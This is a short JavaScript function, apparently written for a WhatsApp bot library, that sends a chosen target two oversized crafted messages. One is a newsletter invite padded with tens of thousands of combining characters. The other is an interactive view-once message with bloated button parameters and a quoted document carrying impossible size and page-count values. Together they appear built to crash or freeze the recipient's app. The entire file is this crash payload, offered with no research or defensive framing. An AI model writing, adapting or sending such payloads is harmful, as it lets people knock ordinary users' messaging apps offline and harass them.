async function newsletterDozzer(sock, target) {
  const repeatStr = (str, times) => str.repeat(times);

  const newsletterMsg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "1@newsletter",
      newsletterName: "𝗭𝗶𝗲𝗲 𝗱𝗲𝗹 𝗥𝗲𝘆... 桜🌸" + repeatStr("ោ៝", 20000),
      caption: "𝗭𝗶𝗲𝗲 𝗱𝗲𝗹 𝗥𝗲𝘆... 桜🌸" + repeatStr("ោ៝", 30000),
      inviteExpiration: "999999999",
    },
  };
  await sock.relayMessage(target, newsletterMsg, {
    participant: { jid: target },
    messageId: null,
  });

  const buttons = [
    "single_select",
    "call_permission_request",
    "cta_url",
    "cta_call",
    "cta_copy",
    "cta_reminder",
    "cta_cancel_reminder",
    "address_message",
    "send_location",
    "quick_reply",
    "mpm",
  ].map((name) => ({ name, buttonParamsJson: "{}".repeat(1000) }));

  const viewOnceMsg = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "\n\n\nx\n\n\n",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: "",
              },
            },
          },
          body: { text: "𝗭𝗶𝗲𝗲 𝗱𝗲𝗹 𝗥𝗲𝘆... 桜🌸" + repeatStr("ꦾ", 10000) },
          nativeFlowMessage: { buttons },
        },
      },
    },
  };

  await sock.relayMessage(target, viewOnceMsg, {
    participant: { jid: target },
  });
}